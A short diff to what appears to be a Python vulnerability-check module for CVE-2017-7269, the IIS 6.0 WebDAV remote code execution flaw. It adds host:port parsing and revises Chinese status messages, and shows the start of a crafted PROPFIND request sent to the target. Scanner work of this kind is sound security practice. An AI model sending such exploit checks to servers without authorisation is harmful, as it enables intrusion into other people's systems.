@@ -29,7 +29,11 @@ class iis_webdav_rce_BaseVerify:
             if flag != -1:
                 host = host[:flag]
         else:
-            host = self.url
+            if self.url.find(":") >= 0:
+                host = self.url.split(":")[0]
+                port = int(self.url.split(":")[1])
+            else:
+                host = self.url
 
         try:
             pay=b'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
@@ -52,9 +56,11 @@ class iis_webdav_rce_BaseVerify:
             sock.close()
             if not -1 == data.find('HHIT CVE-2017-7269 Success'):
                 cprint("[+]存在IIS 6.0 webdav远程代码执行漏洞(CVE-2017-7269)...(高危)\tpayload: "+host+":"+str(port), "red")
+            else:
+                cprint("[-]不存在iis_webdav_rce漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
